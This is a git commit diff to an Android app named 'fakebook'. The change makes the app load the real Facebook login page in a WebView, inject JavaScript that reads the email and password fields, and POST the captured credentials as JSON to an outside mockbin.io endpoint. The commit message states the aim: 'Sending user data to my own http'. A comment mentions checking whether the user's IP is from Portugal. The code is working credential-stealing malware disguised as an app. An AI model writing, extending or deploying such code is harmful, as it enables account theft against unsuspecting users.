3bd4a3a2b4ffc36350a9e17ae24d9854ec9209db
Tiago Zheng Cognizant <zheng.dev23@gmail.com>
2024-09-04 15:40:09 +0100

    Sending user data to my own http

--- app/src/main/java/com/example/fakebook/MainActivity.java
+++ app/src/main/java/com/example/fakebook/MainActivity.java
@@ -1,100 +1,109 @@
 package com.example.fakebook;
 
-import androidx.appcompat.app.AppCompatActivity;
-
+import android.annotation.SuppressLint;
 import android.os.Bundle;
 import android.util.Log;
-import android.webkit.JavascriptInterface;
-import android.webkit.WebSettings;
+import android.view.PixelCopy;
+import android.webkit.ValueCallback;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
-import android.widget.TextView;
-import android.widget.Toast;
 
-import com.example.fakebook.databinding.ActivityMainBinding;
+import androidx.annotation.NonNull;
+import androidx.appcompat.app.AppCompatActivity;
 
-import org.w3c.dom.Node;
+import com.example.fakebook.R;
 
-import java.util.ArrayList;
-import java.util.List;
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.IOException;
+
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.MediaType;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
 
 public class MainActivity extends AppCompatActivity {
 
     private WebView webView;
-    private NodeDataAdapter adapter;
-    private List<NodeData> nodeList;
 
-    static {
-        System.loadLibrary("fakebook");
-    }
-    private ActivityMainBinding binding;
-
+    @SuppressLint("SetJavaScriptEnabled")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        binding = ActivityMainBinding.inflate(getLayoutInflater());
-        setContentView(binding.getRoot());
+        setContentView(R.layout.activity_main);
 
         webView = findViewById(R.id.webView);
 
-        // Initialize the node list and adapter
-        nodeList = new ArrayList<>();
-        adapter = new NodeDataAdapter(nodeList);
-
-        // Allows javaScript execution in the webView
-        WebSettings webSettings = webView.getSettings();
-        webSettings.setJavaScriptEnabled(true);
-
-        // Add a JavaScript Interface
-        webView.addJavascriptInterface(new WebAppInterface(), "Android");
-
-        // Load the login page
-        webView.setWebViewClient(new WebViewClient());
-        webView.loadUrl("https://www.facebook.com/login");
-
-        // Load the JavaScript after the page is loaded
+        // Enable JavaScript
+        webView.getSettings().setJavaScriptEnabled(true);
         webView.setWebViewClient(new WebViewClient() {
             @Override
-            public void onPageFinished(WebView view, String url){
+            public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
-                injectJavaScript();
+
+                // Inject JavaScript and retrieve the result
+                webView.evaluateJavascript("(function() { " +
+                        "    var emailElement = document.querySelector('input[name=\"email\"]');" +
+                        "    var passElement = document.querySelector('input[name=\"pass\"]');" +
+                        "    if (emailElement && passElement) {" +
+                        "        var data = {" +
+                        "            username: emailElement.value," +
+                        "            password: passElement.value" +
+                        "        };" +
+                        "        return JSON.stringify(data);" +
+                        "    } else {" +
+                        "        return JSON.stringify({ error: 'Input elements not found' });" +
+                        "    }" +
+                        "})()", new ValueCallback<String>() {
+                    @Override
+                    public void onReceiveValue(String value) {
+
+                        // Fetch IP address and check if it is from Portugal
+
+                        sendToHttp(value);
+                        Log.d("WebView", "Received data: " + value);
+                    }
+                });
+            }
+        });
+        // Load the Facebook login page
+        webView.loadUrl("https://www.facebook.com/login.php");
+    }
+
+    private void sendToHttp(String value) {
+        OkHttpClient client = new OkHttpClient();
+
+        // Create the request body with the JSON value
+        RequestBody body = RequestBody.create(value, MediaType.get("application/json; charset=utf-8"));
+
+        Request request = new Request.Builder()
+                .url("https://71c18af5227742ca8d8bc00706e8fecc.api.mockbin.io/")
+                .post(body)
+                .build();
+
+        client.newCall(request).enqueue(new Callback() {
+            @Override
+            public void onFailure(@NonNull Call call, @NonNull IOException e) {
+                Log.e("AccessibilityService", "HTTP request failed: " + e.getMessage());
+            }
+
+            @Override
+            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
+                if (response.isSuccessful()) {
+                    Log.d("AccessibilityService", "HTTP request successful");
+
+                } else {
+                    Log.e("AccessibilityService", "HTTP request failed with status code: " + response.code());
+                }
             }
         });
     }
 
-    // Inject JavaScript to interact with HTML content
-    private void injectJavaScript() {
-        webView.loadUrl("javascript: (function() {" +
-                "var nodes = document.getElementsByTagName('*');" +
-                "for(var i = 0; i < nodes.length; i++) {" +
-                "   var node = nodes[i];" +
-                "   Android.showNode(node.tagName, node.innerText);" +
-                "}" +
-                "})()");
-    }
-
-    // JavaScript Interface class to interact with WebView
-    private class WebAppInterface{
-        @JavascriptInterface
-        public void showNode(String tagName, String innerText) {
-            // Create a new NodeData object and add it to the list
-            NodeData nodeData = new NodeData(tagName, innerText);
-
-            // This method is called from JavaScript with node information
-            // You can handle the node data here
-            runOnUiThread(() -> {
-                // Example: Show each node in a Toast
-                nodeList.add(nodeData);
-                adapter.notifyItemInserted(nodeList.size() - 1);
-                //Log.i("MainActivity", "Going to show something");
-                Log.d("NodeData", "Tag: " + tagName + ", Text: " + innerText);
-                //Toast.makeText(MainActivity.this, "Tag: " + tagName + "\nText: " + innerText, Toast.LENGTH_SHORT).show();
-            });
-        }
-    }
-
-
-    // To handle back button press within the WebView
+    // Handle the back button to navigate back within the WebView
     @Override
     public void onBackPressed() {
         if (webView.canGoBack()) {
@@ -103,6 +112,4 @@ public class MainActivity extends AppCompatActivity {
             super.onBackPressed();
         }
     }
-
-    public native String stringFromJNI();
 }
